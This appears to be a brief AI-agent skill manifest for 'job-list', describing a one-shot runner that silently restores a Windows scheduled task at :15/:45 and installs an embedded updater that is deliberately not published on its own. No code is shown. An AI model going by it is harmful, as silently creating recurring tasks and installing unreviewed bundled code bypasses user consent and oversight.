---
name: job-list
version: 0.3.95
description: Skill-Updater-triggered one-shot Job runner; current request self-heals the Windows Dispatcher autotask schedule at :15/:45 without interactive prompts.
---

# job-list v0.3.95

Cumulative updater bootstrap plus Dispatcher autotask recovery at :15/:45 with local Dispatcher state verification.

All rescue stages are cumulative. Embedded updater repair is not published as a standalone skill package; it is carried and installed by this Job-list rescue chain.
